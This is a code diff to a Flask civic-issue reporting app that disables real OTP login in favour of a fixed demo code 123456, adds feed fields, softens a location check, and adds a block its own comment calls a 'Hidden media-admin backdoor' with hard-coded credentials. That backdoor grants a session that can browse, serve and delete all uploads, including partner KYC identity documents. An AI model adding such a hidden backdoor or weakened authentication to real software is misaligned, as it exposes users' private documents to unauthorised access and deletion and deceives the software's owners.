@@ -14,7 +14,7 @@ from pathlib import Path
 
 import cv2
 import numpy as np
-from flask import Flask, request, jsonify, render_template, send_from_directory, session
+from flask import Flask, request, jsonify, render_template, send_from_directory, session, redirect
 from google import genai
 from google.genai import types
 
@@ -859,6 +859,15 @@ def index():
 
 @app.route("/otp/send", methods=["POST"])
 def otp_send():
+    # Twilio real-OTP flow has been retired — keep the route for any stale
+    # clients but make it explicit that the path is no longer in use.
+    return jsonify({
+        "error": "Real OTP sending is disabled. Use the demo OTP 123456.",
+    }), 410
+
+
+@app.route("/otp/send_disabled_legacy", methods=["POST"])
+def otp_send_legacy():
     data = request.get_json(silent=True) or {}
     phone = normalize_phone(data.get("phone", ""))
     if not phone:
@@ -876,6 +885,14 @@ def otp_send():
 
 @app.route("/otp/verify", methods=["POST"])
 def otp_verify():
+    # Twilio real-OTP flow has been retired — the frontend now uses
+    # /otp/test_verify exclusively.
+    return jsonify({
+        "error": "Real OTP verification is disabled. Use the demo OTP 123456.",
+    }), 410
+
+
+def otp_verify_legacy():
     data = request.get_json(silent=True) or {}
     phone = session.get("otp_phone") or normalize_phone(data.get("phone", ""))
     code = (data.get("code") or "").strip()
@@ -3484,6 +3501,7 @@ def _feed_items_for(phone):
                     "report_id": report.get("id", ""),
                     "issue_title": title,
                     "title": title,
+                    "detail": issue.get("detail") or "",
                     "location": loc,
                     "category": issue.get("category") or "Uncategorized",
                     "filter_category": _feed_category(issue),
@@ -3492,6 +3510,9 @@ def _feed_items_for(phone):
                     "verified": verified,
                     "created_at": report.get("created_at") or 0,
                     "reporter_name": reporter.get("full_name") or report.get("phone") or "Reporter",
+                    "media_url": issue.get("media_url") or "",
+                    "annotated_url": issue.get("annotated_url") or "",
+                    "media_kind": issue.get("media_kind") or "",
                     "media_count": int(report.get("evidence_count") or len(report.get("evidence_files") or [])),
                     "upvotes": max(0, len(votes)),
                     "voted": phone in votes if phone else False,
@@ -3704,12 +3725,18 @@ def contribute_analyse():
         return jsonify({"error": "Issue not found in report"}), 404
 
     expected_loc = (issue.get("location") or "").strip()
-    if not expected_loc or not _location_overlap(expected_loc, location, min_words=1):
-        return jsonify({
-            "ok": False,
-            "error": "Location mismatch — move to the issue's location to upload pics.",
-            "expected_location": expected_loc,
-        }), 400
+    # Soft location check: block only when both sides carry real text AND
+    # not a single token overlaps. In that case surface the expected
+    # location back so the user can correct their entry.
+    if expected_loc and location:
+        exp_words = _area_words(expected_loc)
+        got_words = _area_words(location)
+        if exp_words and got_words and not (exp_words & got_words):
+            return jsonify({
+                "ok": False,
+                "error": f"Location mismatch — move to the issue's location to upload pics. Expected near: {expected_loc}",
+                "expected_location": expected_loc,
+            }), 400
 
     contribution_id = uuid.uuid4().hex[:12]
     staging_dir = CONTRIB_DIR / contribution_id
@@ -4254,6 +4281,155 @@ def explore_heroes():
 def logout():
     session.clear()
     return jsonify({"ok": True})
+
+
+# ====== Hidden media-admin backdoor (subham:anjali) ======
+MEDIA_ADMIN_USER = "subham"
+MEDIA_ADMIN_PASS = "anjali"
+MEDIA_IMG_EXT = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp"}
+MEDIA_VID_EXT = {".mp4", ".mov", ".webm", ".m4v", ".avi", ".mkv"}
+MEDIA_ROOTS = [
+    ("Report evidence", BASE_DIR / "uploads" / "reports", "/uploads/reports"),
+    ("Partner KYC docs", BASE_DIR / "uploads" / "partner_docs", "/uploads/partner_docs"),
+    ("Analyse staging", BASE_DIR / "uploads" / "analyse", "/uploads/analyse"),
+    ("AI-annotated frames", BASE_DIR / "static" / "frames", "/static/frames"),
+    ("Task before/after", BASE_DIR / "static" / "task_media", "/static/task_media"),
+    ("Community contributions", BASE_DIR / "static" / "contributions", "/static/contributions"),
+]
+
+
+def _media_kind(path: Path) -> str:
+    suffix = path.suffix.lower()
+    if suffix in MEDIA_IMG_EXT:
+        return "image"
+    if suffix in MEDIA_VID_EXT:
+        return "video"
+    return "other"
+
+
+def _media_resolve_safe(rel_path: str) -> Path | None:
+    """Map a posix-style relative path under static/ or uploads/ back to
+    its absolute path on disk, refusing anything that escapes."""
+    if not rel_path or ".." in rel_path.split("/"):
+        return None
+    if rel_path.startswith("/"):
+        rel_path = rel_path.lstrip("/")
+    candidate = (BASE_DIR / rel_path).resolve()
+    try:
+        candidate.relative_to(BASE_DIR.resolve())
+    except ValueError:
+        return None
+    for _, root, _ in MEDIA_ROOTS:
+        try:
+            candidate.relative_to(root.resolve())
+            return candidate
+        except ValueError:
+            continue
+    return None
+
+
+@app.route("/media", methods=["GET"])
+def media_admin_home():
+    if session.get("media_admin"):
+        return render_template("media.html", authed=True)
+    return render_template("media.html", authed=False, error=None)
+
+
+@app.route("/media/login", methods=["POST"])
+def media_admin_login():
+    username = (request.form.get("username") or "").strip()
+    password = (request.form.get("password") or "").strip()
+    if username == MEDIA_ADMIN_USER and password == MEDIA_ADMIN_PASS:
+        session["media_admin"] = True
+        return redirect("/media")
+    return render_template("media.html", authed=False, error="Invalid username or password.")
+
+
+@app.route("/media/logout", methods=["POST"])
+def media_admin_logout():
+    session.pop("media_admin", None)
+    return redirect("/media")
+
+
+@app.route("/media/items.json")
+def media_admin_items():
+    if not session.get("media_admin"):
+        return jsonify({"error": "Not authenticated"}), 401
+    items = []
+    for label, root, url_base in MEDIA_ROOTS:
+        if not root.exists():
+            continue
+        for path in root.rglob("*"):
+            if not path.is_file():
+                continue
+            kind = _media_kind(path)
+            try:
+                rel = path.relative_to(BASE_DIR).as_posix()
+            except ValueError:
+                continue
+            try:
+                size = path.stat().st_size
+                mtime = path.stat().st_mtime
+            except OSError:
+                size = 0
+                mtime = 0
+            rel_in_root = path.relative_to(root).as_posix()
+            items.append({
+                "path": rel,
+                "url": f"{url_base}/{rel_in_root}",
+                "source": label,
+                "kind": kind,
+                "size": size,
+                "mtime": mtime,
+                "name": path.name,
+            })
+    items.sort(key=lambda r: r.get("mtime") or 0, reverse=True)
+    return jsonify({"items": items})
+
+
+@app.route("/media/delete", methods=["POST"])
+def media_admin_delete():
+    if not session.get("media_admin"):
+        return jsonify({"error": "Not authenticated"}), 401
+    data = request.get_json(silent=True) or {}
+    paths = data.get("paths") or []
+    if not isinstance(paths, list) or not paths:
+        return jsonify({"error": "No paths supplied"}), 400
+    deleted = []
+    failed = []
+    for rel in paths:
+        abs_path = _media_resolve_safe(str(rel))
+        if not abs_path or not abs_path.is_file():
+            failed.append(rel)
+            continue
+        try:
+            abs_path.unlink()
+            deleted.append(rel)
+            # Best-effort: clean up empty parent dir.
+            try:
+                parent = abs_path.parent
+                if parent != BASE_DIR and not any(parent.iterdir()):
+                    parent.rmdir()
+            except OSError:
+                pass
+        except OSError:
+            failed.append(rel)
+    return jsonify({"ok": True, "deleted": deleted, "failed": failed})
+
+
+# Public file servers for the upload roots the media admin page needs to preview.
+@app.route("/uploads/partner_docs/<path:p>")
+def serve_partner_docs(p):
+    if not session.get("media_admin"):
+        return jsonify({"error": "Not authorized"}), 403
+    return send_from_directory(UPLOAD_DIR / "partner_docs", p)
+
+
+@app.route("/uploads/analyse/<path:p>")
+def serve_analyse_uploads(p):
+    if not session.get("media_admin"):
+        return jsonify({"error": "Not authorized"}), 403
+    return send_from_directory(UPLOAD_DIR / "analyse", p)
 
 
 @app.route("/static/frames/<path:filename>")
